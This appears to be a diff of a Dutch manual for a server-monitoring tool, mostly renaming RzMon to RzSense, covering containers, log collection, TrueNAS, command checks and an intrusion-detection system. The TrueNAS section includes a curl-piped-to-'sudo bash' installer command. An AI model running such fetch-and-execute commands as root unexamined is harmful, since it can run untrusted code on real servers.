+- **Gebruiker en wachtwoord**: via de agent is een gebruiker **niet nodig**. Zonder gebruiker leest de agent (als root) MariaDB/MySQL via de socket en PostgreSQL als gebruiker `postgres`, zonder wachtwoord. In een container gebruikt hij voor MariaDB/MySQL root met het wachtwoord uit de container zelf (`MARIADB_ROOT_PASSWORD`/`MYSQL_ROOT_PASSWORD`). Geef je wel een wachtwoord op, dan stuurt RzSense dat alleen naar een **versleutelde agent**; het gaat via de omgeving naar de client, nooit op de opdrachtregel. Via het netwerk is een gebruiker nodig, met alleen leesrechten:
   ```sql
   -- MariaDB / MySQL
   CREATE USER 'rzmon_check'@'%' IDENTIFIED BY '…';
@@ -2192,7 +2194,7 @@ Checks op dezelfde database **delen één meting**: zet je er vijf op, dan meet 
 - Alles is **alleen lezen**: `SHOW GLOBAL STATUS`, `information_schema`, `pg_stat_*`. De agent leest nooit data uit je tabellen.
 - De grootte per database (MariaDB/MySQL) meet de agent hooguit eens per half uur: `information_schema.tables` kan op grote servers traag zijn.
 - Op een primaire PostgreSQL zonder schrijfverkeer lijkt een replica soms achter te lopen (de laatste transactie is gewoon oud); kijk dan naar de replicatie op de primaire (aantal verbonden replica's).
-- Bestaande MariaDB-checks van vóór 1.200.0 blijven werken zoals ze waren (RzMon maakt verbinding, overzicht).
+- Bestaande MariaDB-checks van vóór 1.200.0 blijven werken zoals ze waren (RzSense maakt verbinding, overzicht).
 
 ### 8.6 Containers: Podman en Docker 📦
 
@@ -2206,7 +2208,7 @@ Checks op dezelfde database **delen één meting**: zet je er vijf op, dan meet 
 | **Failed** | gestopt met een foutcode (bv. 137 = geheugen op), vastgelopen of ongezond (healthcheck faalt) | CRITICAL |
 | **Stopped** | netjes gestopt met exitcode 0, of nog nooit gestart | WARNING |
 | **Paused** | gepauzeerd | WARNING |
-**Docker** (vanaf RzMon 1.137.0, agent 1.69.0) werkt precies zoals Podman hieronder: dezelfde checks (*Containers (algemeen)* en *Container (Podman/Docker)*), dezelfde lijst in het venster van de server, compose-projecten verschijnen als pods, en *zelf herstellen* herstart een Docker-container net zo. De agent meldt Docker alleen als de Docker-daemon draait; staan Podman en Docker allebei op de server, dan zie je ze naast elkaar (gebruiker *docker* voor de Docker-containers). `DOCKER=0` in `/etc/default/rzmon-agent` zet Docker uit.
+**Docker** (vanaf RzSense 1.137.0, agent 1.69.0) werkt precies zoals Podman hieronder: dezelfde checks (*Containers (algemeen)* en *Container (Podman/Docker)*), dezelfde lijst in het venster van de server, compose-projecten verschijnen als pods, en *zelf herstellen* herstart een Docker-container net zo. De agent meldt Docker alleen als de Docker-daemon draait; staan Podman en Docker allebei op de server, dan zie je ze naast elkaar (gebruiker *docker* voor de Docker-containers). `DOCKER=0` in `/etc/default/rzmon-agent` zet Docker uit.
 
 Staat **podman** op de server, dan meldt de agent vanzelf alle containers. Er hoeft niets ingesteld te worden. Zonder podman stuurt de agent hier niets over.
 
@@ -2220,13 +2222,13 @@ Staat **podman** op de server, dan meldt de agent vanzelf alle containers. Er ho
 | | **Disk**: de schrijflaag van de container plus de grootte van zijn volumes. Volumes worden elk uur opnieuw gemeten |
 | **Per pod** | Status (Running, Degraded…) en aantal containers |
 
-**Rootless containers:** naast de containers van root zoekt de agent gebruikers die zelf containers hebben (in `~/.local/share/containers`). Een gebruiker die podman ooit gestart heeft maar geen containers heeft, telt niet mee. De containers staan in RzMon als `gebruiker/naam`.
+**Rootless containers:** naast de containers van root zoekt de agent gebruikers die zelf containers hebben (in `~/.local/share/containers`). Een gebruiker die podman ooit gestart heeft maar geen containers heeft, telt niet mee. De containers staan in RzSense als `gebruiker/naam`.
 - Andere keuze: zet `PODMAN_USERS="jan piet"` in `/etc/default/rzmon-agent` voor een vaste lijst, of `PODMAN_USERS=""` voor alleen root. `PODMAN=0` zet podman helemaal uit.
 - **CPU en RAM van rootless containers** vereisen cgroups v2; dat is standaard op Rocky/RHEL 9 en 10, Debian 11+ en Ubuntu 22.04+.
 - **Lingering:** zet voor die gebruiker *lingering* aan (`sudo loginctl enable-linger jan`), anders stoppen de containers als de gebruiker uitlogt. Dat is sowieso aan te raden.
 - **systemd-service:** het installatiescript zet op servers met podman `NoNewPrivileges` en `ProtectHome` uit, omdat rootless podman die nodig heeft. Na het bijwerken van een bestaande agent: `sudo rzmon-agent-setup --update`.
 
-**In RzMon:** klap de server open en klik op **📦 Containers**. Je ziet alle containers met status, CPU, RAM en disk.
+**In RzSense:** klap de server open en klik op **📦 Containers**. Je ziet alle containers met status, CPU, RAM en disk.
 - **Eén check per container.** Klik bij een container op **＋ Bewaken**. De status wordt altijd bewaakt; vink daarnaast **CPU**, **RAM** en/of **disk** aan, elk met eigen drempels. Wordt een container al bewaakt, dan staat er bijvoorbeeld **✓ status, CPU, RAM ✎**; klik om aan te passen.
 - Bovenaan staan **＋ Podman-check** (algehele status) en **＋ Alle containers bewaken** (alleen de status; resources vink je daarna per container aan).
 - Je kunt het ook via **＋ Check** doen: kies het type *Container (Podman)* en de container uit de lijst.
@@ -2308,17 +2310,17 @@ sudo chmod 755 /etc/rzmon-agent/tests/myapp
 ```
 - Bestaande Nagios-plugins werken ook; die gebruiken dezelfde exitcodes.
 - **Veiligheid:** het script moet van root zijn en mag niet door anderen te wijzigen zijn, anders voert de agent het niet uit. Het mag maximaal 20 seconden duren.
-- Via RzMon kunnen nooit commando's op je servers worden uitgevoerd; alleen URL- en poorttests.
+- Via RzSense kunnen nooit commando's op je servers worden uitgevoerd; alleen URL- en poorttests.
 
 **Goed om te weten:**
 - **Uitzetten:** per check zet je *Diepere controle* uit, dan wordt alleen "active" gecontroleerd. Voor de hele server: `SERVICE_DEEP=0` in `/etc/default/rzmon-agent`.
 - **Eenmalige services** (`Type=oneshot`, zoals een firewall-script) die "exited" zijn, gelden als goed.
-- **Op de RzMon-server zelf** (type *Lokaal*) wordt alleen de status gecontroleerd. Wil je daar ook de diepere controle, installeer dan de agent en maak een server van type *Remote met agent*.
+- **Op de RzSense-server zelf** (type *Lokaal*) wordt alleen de status gecontroleerd. Wil je daar ook de diepere controle, installeer dan de agent en maak een server van type *Remote met agent*.
 - Controleren op de server: `sudo rzmon-agent-setup --test` toont per service de poorten en het resultaat van de test.
 
 
 ### 8.8 Logbestanden doorzoeken 🔎📜
-De agent kan logbestanden doorzoeken op bijvoorbeeld **mislukte logins** of **hardwarefouten**. Je stelt alles in RzMon in: klik bij de server op **＋ Check** en kies *Logbestand (zoeken)*.
+De agent kan logbestanden doorzoeken op bijvoorbeeld **mislukte logins** of **hardwarefouten**. Je stelt alles in RzSense in: klik bij de server op **＋ Check** en kies *Logbestand (zoeken)*.
 
 1. **Voorinstelling:** kies er een, of *Zelf instellen*. Een voorinstelling vult de bron, het zoekpatroon, de drempels en de naam in; daarna kun je alles nog aanpassen.
 2. **Zoek naar:** een zoekpatroon (regex). Hoofdletters maken niet uit, en `|` betekent "of". Voorbeeld: `Failed password|Invalid user`. Gebruik `[0-9]` voor een cijfer; `\d` werkt niet.
@@ -2375,7 +2377,7 @@ Klik op 📈 voor de grafiek van het aantal treffers en de **laatste 5 gevonden 
 ### 8.9 TrueNAS
 **TrueNAS SCALE** (Linux) draait de agent op een eigen manier: `/usr` en `/etc` horen bij TrueNAS zelf, en wat je daar zet verdwijnt bij een TrueNAS-update. De installer zet de agent daarom op je **pool** en laat hem starten door een **cronjob van TrueNAS** zelf.
 
-1. Voeg in RzMon een server toe met type **Remote met agent**.
+1. Voeg in RzSense een server toe met type **Remote met agent**.
 2. Open de **Agent Manager** en kies het tabblad **🗄️ TrueNAS SCALE**. Kopieer het commando (adres en token zijn al ingevuld):
    ```bash
    curl -fsSL 'http://RZMON-ADRES/api.php?action=agent_install' | sudo bash -s -- --url 'http://RZMON-ADRES' --token 'TOKEN' --truenas
@@ -2383,20 +2385,20 @@ Klik op 📈 voor de grafiek van het aantal treffers en de **laatste 5 gevonden 
 3. Voer het uit in TrueNAS onder **System → Shell** (of via SSH). Het script:
    - kiest de eerste pool (niet `boot-pool`) en zet alles in `/mnt/<pool>/rzmon-agent`. Een andere pool kies je met `--pool naam`, een eigen map met `--dir /mnt/…`;
    - schrijft de instellingen (`agent.conf`, alleen leesbaar voor root);
-   - maakt via de TrueNAS-API de cronjob **RzMon agent** aan: als root, elke minuut, met *Hide Standard Output/Error* aan. Je ziet hem onder *System → Advanced → Cron Jobs*;
-   - stuurt een testrapport naar RzMon.
+   - maakt via de TrueNAS-API de cronjob **RzSense agent** aan: als root, elke minuut, met *Hide Standard Output/Error* aan. Je ziet hem onder *System → Advanced → Cron Jobs*;
+   - stuurt een testrapport naar RzSense.
 
-Had je de agent al met de hand geïnstalleerd (map, `agent.conf` en een cronjob met de naam *RzMon agent*)? Dan worden je instellingen en die cronjob overgenomen.
+Had je de agent al met de hand geïnstalleerd (map, `agent.conf` en een cronjob met de naam *RzSense agent*)? Dan worden je instellingen en die cronjob overgenomen.
 
 Goed om te weten:
-- **Bijwerken:** met de knop in RzMon (*Agent Manager* of *Instellingen → Agents*), net als op andere servers. Met de hand: `bash /mnt/<pool>/rzmon-agent/rzmon-agent-setup --update`.
+- **Bijwerken:** met de knop in RzSense (*Agent Manager* of *Instellingen → Agents*), net als op andere servers. Met de hand: `bash /mnt/<pool>/rzmon-agent/rzmon-agent-setup --update`.
 - **Testen:** `bash /mnt/<pool>/rzmon-agent/rzmon-agent-setup --test`. **Verwijderen:** `… --uninstall`; dat haalt ook de cronjob weg.
 - **Lukt de cronjob via de API niet**, dan zegt het script dat en toont het het commando om hem zelf aan te maken.
 - **Disks:** je pools staan onder `/mnt/…`, bijvoorbeeld een diskcheck op `/mnt/tank`.
 - **Pools bewaken:** voeg een **Commando**-check toe (§8.10) met `zpool status -x` en verwacht antwoord `all pools are healthy`, of kies de voorinstelling *ZFS-pools gezond*.
 - **Apps (Docker):** de agent ziet de containers van je apps (Docker, als root), net als op andere servers. Met de TrueNAS-check *Apps* (hieronder) zie je ook de status van TrueNAS zelf (vastgelopen, gestopt, update beschikbaar).
 
-**🗄️ TrueNAS uitlezen** (vanaf RzMon 1.174.0, agent 1.77.0, als root)
+**🗄️ TrueNAS uitlezen** (vanaf RzSense 1.174.0, agent 1.77.0, als root)
 
 De agent vraagt TrueNAS zelf met `midclt`, zonder API-sleutel: alles gaat over de bestaande versleutelde verbinding. Bij de server staat dan de knop **🗄️ TrueNAS** met een overzicht, en per onderdeel een knop om er een check van te maken. Of kies bij *＋ Check* het type **TrueNAS**:
 
@@ -2406,23 +2408,23 @@ De agent vraagt TrueNAS zelf met `midclt`, zonder API-sleutel: alles gaat over d
 | Taken | replicatie, snapshots, cloud sync en rsync: is de laatste keer mislukt, dan CRITICAL met de foutmelding. Eén taak: vul (een deel van) de naam in. | elke 5 min |
 | Apps | vastgelopen app = CRITICAL; gestopte apps en beschikbare app-updates staan in de melding. Eén app: CRITICAL als die niet draait. | elke 5 min |
 | TrueNAS-update | WARNING als er een nieuwe versie klaarstaat, of TrueNAS op een herstart wacht na een update | elke 6 uur |
-| Schijftemperatuur | de warmste schijf (of één schijf), standaard warning 50 °C en critical 60 °C. Geeft TrueNAS ze niet via `midclt` (bv. TrueNAS 27), dan gebruikt RzMon vanaf 1.175.0 de temperaturen uit SMART (smartctl, al meegestuurd door de agent). | elk kwartier |
+| Schijftemperatuur | de warmste schijf (of één schijf), standaard warning 50 °C en critical 60 °C. Geeft TrueNAS ze niet via `midclt` (bv. TrueNAS 27), dan gebruikt RzSense vanaf 1.175.0 de temperaturen uit SMART (smartctl, al meegestuurd door de agent). | elk kwartier |
 
 `TRUENAS=0` in `agent.conf` zet het uitlezen uit.
 
-**Kwetsbaarheden** (vanaf 1.174.0): TrueNAS is Debian eronder. RzMon leest uit het pakket `base-files` welke Debian het is en scant met de Debian-adviezen. Bijwerken gaat **nooit met apt** (dat kan TrueNAS kapotmaken): daarom zit er geen knop *Bijwerken* bij. Werk bij met een TrueNAS-update (*System → Update*).
+**Kwetsbaarheden** (vanaf 1.174.0): TrueNAS is Debian eronder. RzSense leest uit het pakket `base-files` welke Debian het is en scant met de Debian-adviezen. Bijwerken gaat **nooit met apt** (dat kan TrueNAS kapotmaken): daarom zit er geen knop *Bijwerken* bij. Werk bij met een TrueNAS-update (*System → Update*).
 
 **IDS op TrueNAS** (vanaf 1.174.0, agent 1.77.0): standaard **alleen detecteren**, want TrueNAS beheert zijn eigen netwerk. Wil je dat het IDS ook blokkeert, open dan bij de server **🛡️ Hardening** en zet **IDS mag hier blokkeren** aan (met je wachtwoord). Dan:
 - blokkeert het IDS aanvallers en werkt de honeypot-poort, net als op andere servers;
 - gebruikt de agent een eigen firewalltabel (`inet rzmon`) en zet die elke minuut terug, ook na een herstart of update van TrueNAS;
-- worden je lokale netwerken en RzMon nooit geblokkeerd.
+- worden je lokale netwerken en RzSense nooit geblokkeerd.
 Isoleren werkte al op TrueNAS.
 
 **Agents-overzicht:** TrueNAS-servers staan in een eigen groep **🗄️ TrueNAS**, onder de andere agents.
 - **TrueNAS CORE** (FreeBSD) kan de agent niet draaien. Voeg hem toe als **Remote** met ping, poorten (445 SMB, 2049 NFS, 22 SSH) en HTTP(S) op de webinterface.
 
 ### 8.8b Logs verzamelen 📜 (vanaf 1.210.0, agent 1.83.0)
-De agent verzamelt de logs die je per server kiest en stuurt ze naar RzMon, waar ze gecomprimeerd bewaard worden. Zoeken doe je op de pagina **Logs** (vanaf 1.211.0, zie hieronder); een zoekopdracht bewaren als melding kan vanaf 1.212.0 (*Vaste zoekacties*, hieronder).
+De agent verzamelt de logs die je per server kiest en stuurt ze naar RzSense, waar ze gecomprimeerd bewaard worden. Zoeken doe je op de pagina **Logs** (vanaf 1.211.0, zie hieronder); een zoekopdracht bewaren als melding kan vanaf 1.212.0 (*Vaste zoekacties*, hieronder).
 
 **Bronnen kiezen:** open de **Agent Manager** van de server, kaart **📜 Logs**, en voeg een bron toe (of kies een voorstel: nginx, apache2, syslog, auth.log, fail2ban, de journal, TrueNAS middleware, Home Assistant Core).
 - **Bestand of map**: een volledig pad, met `*` voor meerdere bestanden, bv. `/var/log/nginx/*.log` (hooguit 20 bestanden per bron; `.gz` en andere ingepakte bestanden worden overgeslagen).
@@ -2442,21 +2444,21 @@ De agent verzamelt de logs die je per server kiest en stuurt ze naar RzMon, waar
 - Labels: **✓ verzameld** (staat al bij de bronnen, ook als je een eigen patroon gebruikt), **nieuw** (sinds de vorige keer gevonden) en grijs voor stil (30 dagen niets) of gestopt, onderaan.
 - Overgeslagen: gedraaide bestanden (`.1`, `.gz`, `-20250101`), binaire bestanden (`wtmp`, `btmp`, `lastlog`) en de map `journal` (die staat bij Services). Mappen zonder leesrechten worden genoemd.
 - **Wanneer**: de agent zoekt één keer per dag vanzelf, en meteen met **🔄 Opnieuw zoeken**. De lijst komt dan bij het volgende of het rapport daarna binnen, meestal binnen een of twee minuten. De pagina wacht er zelf op.
-- De agent stuurt alleen namen, groottes en tijden, nooit wat er in de logs staat. Een log in een andere map: zet die op de server in `LOG_DIRS` (`/etc/default/rzmon-agent`) en klik op Opnieuw zoeken. RzMon kan zelf geen mappen openzetten.
+- De agent stuurt alleen namen, groottes en tijden, nooit wat er in de logs staat. Een log in een andere map: zet die op de server in `LOG_DIRS` (`/etc/default/rzmon-agent`) en klik op Opnieuw zoeken. RzSense kan zelf geen mappen openzetten.
 
 **Veiligheid:**
-- De agent leest alleen bestanden **binnen de mappen die je op de server zelf toestaat**: `LOG_DIRS="/var/log"` in `/etc/default/rzmon-agent` (meerdere mappen met een spatie). Zo kan niemand via RzMon andere bestanden van de server opvragen.
-- De logs gaan **altijd versleuteld** naar RzMon (met de sleutel van de agent; onversleuteld wordt geweigerd), en **gecomprimeerd** (gzip).
+- De agent leest alleen bestanden **binnen de mappen die je op de server zelf toestaat**: `LOG_DIRS="/var/log"` in `/etc/default/rzmon-agent` (meerdere mappen met een spatie). Zo kan niemand via RzSense andere bestanden van de server opvragen.
+- De logs gaan **altijd versleuteld** naar RzSense (met de sleutel van de agent; onversleuteld wordt geweigerd), en **gecomprimeerd** (gzip).
 - **Maskeren** (standaard aan): wachtwoorden, tokens, API-sleutels en e-mailadressen worden vóór het opslaan `••••`. Eigen patronen voeg je toe in de instellingen.
 - Zoeken mag voor beheerders en gebruikers, niet voor *alleen lezen*.
 
 **Hoe het werkt:**
 - Elke run leest de agent alleen de **nieuwe regels**. Per bestand onthoudt hij waar hij was, ook na logrotatie. Een **nieuwe bron begint aan het einde**: oude regels worden niet ingelezen.
 - Een halve laatste regel (nog niet helemaal geschreven) komt de volgende keer.
-- Elke **5 minuten** (instelbaar, ook per server) gaan de nieuwe regels als één pakketje naar RzMon, los van het gewone rapport.
-- Pas als RzMon het pakketje heeft opgeslagen, gooit de agent het weg. Is RzMon niet bereikbaar, dan bewaart de agent de pakketjes (samen tot 50 MB) en stuurt hij ze later.
+- Elke **5 minuten** (instelbaar, ook per server) gaan de nieuwe regels als één pakketje naar RzSense, los van het gewone rapport.
+- Pas als RzSense het pakketje heeft opgeslagen, gooit de agent het weg. Is RzSense niet bereikbaar, dan bewaart de agent de pakketjes (samen tot 50 MB) en stuurt hij ze later.
 - **De logbestanden op de server zelf blijven staan**; die ruimt logrotate op.
-- RzMon herkent het **niveau** (debug, info, warning, error, critical) en de **tijd** uit de regel (ISO, syslog, nginx/apache; met de tijdzone van de server). Zonder herkenbare tijd geldt de tijd van lezen.
+- RzSense herkent het **niveau** (debug, info, warning, error, critical) en de **tijd** uit de regel (ISO, syslog, nginx/apache; met de tijdzone van de server). Zonder herkenbare tijd geldt de tijd van lezen.
 
 **Instellingen** (*Instellingen → Monitoring → Logs*):
 - **Logs verzamelen** (hoofdschakelaar), **versturen elke** 5 minuten (1–60), **bewaren** 14 dagen, **maximaal in totaal** 5 GB, **maximaal per server per dag** 200 MB.
@@ -2471,7 +2473,7 @@ De agent verzamelt de logs die je per server kiest en stuurt ze naar RzMon, waar
 - **Grafiek**: treffers per minuut (tot 3 uur), per uur (tot 3 dagen) of per 6 uur, opgedeeld in error, warning en info. Klik op een balk voor alleen dat tijdvak.
 - **Treffers**: nieuwste eerst, het gezochte woord gemarkeerd. Klik op een regel voor **3 regels ervoor en erna** uit dezelfde bron, en de regels van **andere bronnen van die server in dezelfde minuut** (bv. fail2ban naast auth.log).
 - **Meer laden** per 100 (tot 1000), en **⤓ CSV** met tot 5000 treffers (puntkomma, opent in Excel).
-- Snel: RzMon pakt alleen de blokken uit die in de periode en bij de server en bron vallen (met *Error en erger* alleen blokken met errors). Duurt het tellen langer dan 8 seconden, dan zegt de pagina dat de telling onvolledig is; de nieuwste treffers kloppen dan wel.
+- Snel: RzSense pakt alleen de blokken uit die in de periode en bij de server en bron vallen (met *Error en erger* alleen blokken met errors). Duurt het tellen langer dan 8 seconden, dan zegt de pagina dat de telling onvolledig is; de nieuwste treffers kloppen dan wel.
 - Gemaskeerde delen (`••••`) blijven gemaskeerd: het origineel wordt nergens bewaard.
 - Het tabblad **Binnenkomst** toont hetzelfde overzicht als de beheerportal: opslag en per server wat er vandaag binnenkwam.
 
@@ -2484,10 +2486,10 @@ De agent verzamelt de logs die je per server kiest en stuurt ze naar RzMon, waar
 - **Rustperiode** (15 minuten tot 24 uur): de minimale tijd tussen twee meldingen van dezelfde zoekactie en server.
 - **Herstel** (standaard aan): de melding gaat vanzelf dicht met een herstelmelding zodra een heel venster lang de drempel niet meer gehaald wordt. Bij *Geen treffers* gebeurt dat zodra er weer een treffer is. Staat Herstel uit, dan gaat hij na de rustperiode stil dicht.
 - **Proef**: in het venster zie je meteen hoe vaak de zoekactie de afgelopen 24 uur een melding had gegeven, met een grafiek per 5 minuten, de drempel als stippellijn en de tijden. Zo zie je vóór het bewaren of de drempel te gevoelig is.
-- **Wanneer**: RzMon telt bij elk binnenkomend logpakket alleen de nieuwe regels, en alleen voor de zoekacties die bij die server en bron passen. *Geen treffers* en het herstel controleert RzMon elke minuut. Het telt de tijd van de logregel zelf. Regels die meer dan 1 uur te laat binnenkomen (de agent was offline) tellen niet voor een melding.
+- **Wanneer**: RzSense telt bij elk binnenkomend logpakket alleen de nieuwe regels, en alleen voor de zoekacties die bij die server en bron passen. *Geen treffers* en het herstel controleert RzSense elke minuut. Het telt de tijd van de logregel zelf. Regels die meer dan 1 uur te laat binnenkomen (de agent was offline) tellen niet voor een melding.
 - **De melding**: staat op de pagina **Meldingen** als storing, met *Nu open*, de duur, gezien en hersteld, net als bij een check. Hij gaat via Pushover, e-mail en Home Assistant (critical met hoge prioriteit, warning normaal, info stil). Stille uren gelden ook: die van de server, of de algemene bij *alle servers samen*. In het zijpaneel staan de laatste 3 regels, de zoekopdracht en de knoppen **📜 In Logs bekijken** (de zoekopdracht rond dat moment) en **Zoekactie aanpassen**.
 - **Lijst**: per zoekactie een schakelaar aan/uit, de voorwaarde, een grafiekje van de laatste 24 uur (rood = een uur boven de drempel), de status (*OK* of *Melding open* per server), wanneer hij laatst meldde, en de knoppen 🔎 Zoeken, ✎ en 🗑 (tweemaal klikken).
-- **Grenzen**: hooguit 50 vaste zoekacties. Kost een zoekactie 3 pakketjes achter elkaar meer dan 50 ms (een zware regex), dan zet RzMon hem uit en meldt dat (Instellingen › Meldingen › Systeeminfo › Logs).
+- **Grenzen**: hooguit 50 vaste zoekacties. Kost een zoekactie 3 pakketjes achter elkaar meer dan 50 ms (een zware regex), dan zet RzSense hem uit en meldt dat (Instellingen › Meldingen › Systeeminfo › Logs).
 
 **Opslag:** per dag een tabel (`logd_JJJJMMDD`) met blokken van hooguit 5000 regels per bron, elk met gzip gecomprimeerd: ongeveer 7 à 8 keer kleiner dan de logs zelf. Een dag ouder dan de bewaartermijn gaat in één keer weg. Uitzetten op een server: `LOG_SHIP=0` in `/etc/default/rzmon-agent`.
 
@@ -2520,7 +2522,7 @@ Proxmox VE is Debian: de gewone agent draait er gewoon, als **root** op de host 
 **Goed om te weten:** dit is nog niet op een echte Proxmox getest; laat weten als iets niet klopt. De oude commando-voorinstellingen voor Proxmox (§8.10) blijven werken, maar de checks hierboven zijn uitgebreider.
 
 ### 8.10 Commando-checks 🖥️
-Met een **Commando**-check voert de agent een commando uit op de server, en vergelijkt RzMon de uitvoer met het antwoord dat je verwacht. Voorbeelden:
+Met een **Commando**-check voert de agent een commando uit op de server, en vergelijkt RzSense de uitvoer met het antwoord dat je verwacht. Voorbeelden:
 
 | Commando | Goed als de uitvoer | Verwacht antwoord |
 |---|---|---|
@@ -2537,7 +2539,7 @@ Met een **Commando**-check voert de agent een commando uit op de server, en verg
 
 Per server kun je dat anders instellen in de **Agent Manager** (*Commando-checks op deze server*). Ruimer maken (uit → nobody → root) vraagt om je wachtwoord, en elke wijziging komt in het **logboek** (ook het aanmaken en wijzigen van commando-checks).
 
-**Op de server zelf** kun je het altijd inperken, wat RzMon ook zegt. Zet daarvoor in de instellingen van de agent (`/etc/default/rzmon-agent`, of `agent.conf` op TrueNAS):
+**Op de server zelf** kun je het altijd inperken, wat RzSense ook zegt. Zet daarvoor in de instellingen van de agent (`/etc/default/rzmon-agent`, of `agent.conf` op TrueNAS):
 - `COMMANDS=0`: nooit commando's uitvoeren;
 - `COMMANDS=nobody`: nooit als root.
 
@@ -2553,7 +2555,7 @@ Deze regels blijven staan als je de agent opnieuw installeert.
 
 Voorinstellingen met *(root)* werken alleen als commando's op die server *als root* mogen; het formulier waarschuwt als dat niet zo is. De voorinstellingen voor TrueNAS en Proxmox zijn nog niet op een echt systeem getest. Klopt er een niet, laat het weten.
 
-**＋ Aanbevolen checks** (knop in de *Agent Manager*): RzMon herkent of de server een TrueNAS, Proxmox of gewone Linux-server is (en Debian- of RHEL-familie), en toont een lijst met vinkjes. De aanbevolen checks staan al aangevinkt; checks die er al zijn worden overgeslagen. Met één klik worden ze allemaal toegevoegd.
+**＋ Aanbevolen checks** (knop in de *Agent Manager*): RzSense herkent of de server een TrueNAS, Proxmox of gewone Linux-server is (en Debian- of RHEL-familie), en toont een lijst met vinkjes. De aanbevolen checks staan al aangevinkt; checks die er al zijn worden overgeslagen. Met één klik worden ze allemaal toegevoegd.
 
 **De check toevoegen:** *＋ Check → Commando*. Vul in:
 - het **commando**, bijvoorbeeld `zpool status -x`;
@@ -2567,12 +2569,12 @@ Voorinstellingen met *(root)* werken alleen als commando's op die server *als ro
 - de **time-out** (1–60 s, standaard 10).
 
 Hoe het werkt:
-- De agent voert het commando uit in `bash`, in een kale omgeving, zonder invoer, met een time-out en standaard als `nobody`. Hij stuurt de uitvoer (hooguit 4 KB) en de exitcode naar RzMon. Daar wordt vergeleken, dus een ander verwacht antwoord werkt meteen.
+- De agent voert het commando uit in `bash`, in een kale omgeving, zonder invoer, met een time-out en standaard als `nobody`. Hij stuurt de uitvoer (hooguit 4 KB) en de exitcode naar RzSense. Daar wordt vergeleken, dus een ander verwacht antwoord werkt meteen.
 - Het commando draait volgens het **interval** van de check. Alle commando's samen hooguit ongeveer 40 seconden per rapport.
 - Op het dashboard zie je wat er terugkwam, bijvoorbeeld *Antwoord: "degraded" – verwacht: is gelijk aan "all pools are healthy"*. Ook een time-out, *commando niet gevonden* en *geblokkeerd op de server* worden duidelijk gemeld.
 - In de verbindingstest (`rzmon-agent-setup --test`) staat per commando-check de exitcode, de tijd en als wie hij draaide.
 - Niet in de Home Assistant-add-on.
-- **Gebruik bij voorkeur HTTPS naar RzMon.** De lijst met commando's gaat van RzMon naar de agent; over gewone HTTP kan iemand op je netwerk die onderweg aanpassen.
+- **Gebruik bij voorkeur HTTPS naar RzSense.** De lijst met commando's gaat van RzSense naar de agent; over gewone HTTP kan iemand op je netwerk die onderweg aanpassen.
 
 ### 8.11 Logins en sudo 🔑
 De agent meldt wie er op een server inlogt en wie `sudo` of `su` gebruikt. Je ziet het op de pagina **🛡️ IDS**, tabblad **🔑 Toegang** (tot en met 1.37.0 stond het op de pagina Meldingen; bij de update naar 1.38.0 verhuizen de bestaande regels mee). Er gaat geen Pushover-, mail- of Home Assistant-bericht uit.
@@ -2605,7 +2607,7 @@ Goed om te weten:
 - **Werkt op** Linux-servers en TrueNAS SCALE, niet in de Home Assistant-add-on. Agent 1.33.0 of nieuwer nodig.
 
 ### 8.12 IDS: inbraakdetectie 🛡️
-De agent let op tekenen van een inbraak en RzMon vergelijkt dat met wat normaal is op die server. Alles komt op de pagina **🛡️ IDS**. Bij *blokkeren* zet de agent aanvallende IP-adressen ook echt in de firewall van die server.
+De agent let op tekenen van een inbraak en RzSense vergelijkt dat met wat normaal is op die server. Alles komt op de pagina **🛡️ IDS**. Bij *blokkeren* zet de agent aanvallende IP-adressen ook echt in de firewall van die server.
 
 **De pagina 🛡️ IDS** (vanaf 1.67.0 in dezelfde opbouw als het dashboard):
 - **Tellers** onder de header: open incidenten (🔴 Critical, 🟠 Warning), ⛔ nu geblokkeerd, 🔑 logins en ❌ mislukte logins in de laatste 24 uur. Klik erop en je gaat naar het juiste tabblad.
@@ -2679,14 +2681,14 @@ Begin met *leren* en kijk een paar dagen wat er gemeld wordt. Schakel pas over n
   - **van binnen** (je *Lokale netwerken* onder *Toegang*) en aan de **console**: een ℹ️ systeeminfo-bericht *SSH-login* of *Console-login*. Per kanaal aan of uit bij *Instellingen → Meldingen → ℹ️ Systeeminfo → Login op een server* (standaard alleen op de meldingenpagina);
   - geeft een login al een incident (*Root-login*, *nieuw IP* of *Inlog na brute force*), dan komt er niets dubbel bij;
   - gebruikers en IP's in de lijst *Negeren* (Toegang) geven geen 🔑-incident of bericht;
-  - **login-incidenten van binnen** (*nieuw IP*, *Root-login*) sluiten na **24 uur** vanzelf (afgehandeld door *RzMon*); die van buiten blijven open. *Inlog na brute force* (critical) blijft altijd open.
+  - **login-incidenten van binnen** (*nieuw IP*, *Root-login*) sluiten na **24 uur** vanzelf (afgehandeld door *RzSense*); die van buiten blijven open. *Inlog na brute force* (critical) blijft altijd open.
 - Een rood bolletje op het tabblad **🛡️ IDS** telt de open critical incidenten.
 - De pagina heeft drie tabbladen: **⚠️ Incidenten**, **🔑 Toegang** (logins, sudo en su, zie [8.11](#811-logins-en-sudo-)) en **⛔ Blokkades**. Het laatst gekozen tabblad wordt per apparaat onthouden.
 - Dezelfde melding binnen 24 uur wordt niet opnieuw gestuurd; de teller loopt op (*5×*).
 
 **🍯 Honeypot** (vanaf 1.81.0, agent 1.54.0; *Instellingen → IDS → Algemeen → Honeypot*)
 - **Honeypot-gebruikers:** namen die bij jou nooit bestaan en die alleen aanvallers proberen. Standaard `admin test guest user oracle ubuntu pi ftp support postgres`; vul gerust aan. Eén mislukte SSH-login met zo'n naam is genoeg: van buiten wordt het IP meteen geblokkeerd (in de modus *blokkeren*), niet pas na 10 pogingen. Bestaat de naam op een server echt (bv. `postgres` op een databaseserver), dan geldt hij daar niet als honeypot.
-- **Honeypot-poort** (standaard TCP **2323**, leeg = uit): niemand van jou maakt daar verbinding mee, dus elke verbinding is een scanner. Er luistert niets: de agent zet een regel in zijn eigen firewalltabel (`inet rzmon`) die het IP onthoudt en de verbinding stil weggooit. Werkt ook in de modus *leren* (dan alleen melden). Is de poort op een server in gebruik, dan staat dat bij die server bovenaan de pagina IDS. RzMon zelf (bv. een poortscan) telt niet mee.
+- **Honeypot-poort** (standaard TCP **2323**, leeg = uit): niemand van jou maakt daar verbinding mee, dus elke verbinding is een scanner. Er luistert niets: de agent zet een regel in zijn eigen firewalltabel (`inet rzmon`) die het IP onthoudt en de verbinding stil weggooit. Werkt ook in de modus *leren* (dan alleen melden). Is de poort op een server in gebruik, dan staat dat bij die server bovenaan de pagina IDS. RzSense zelf (bv. een poortscan) telt niet mee.
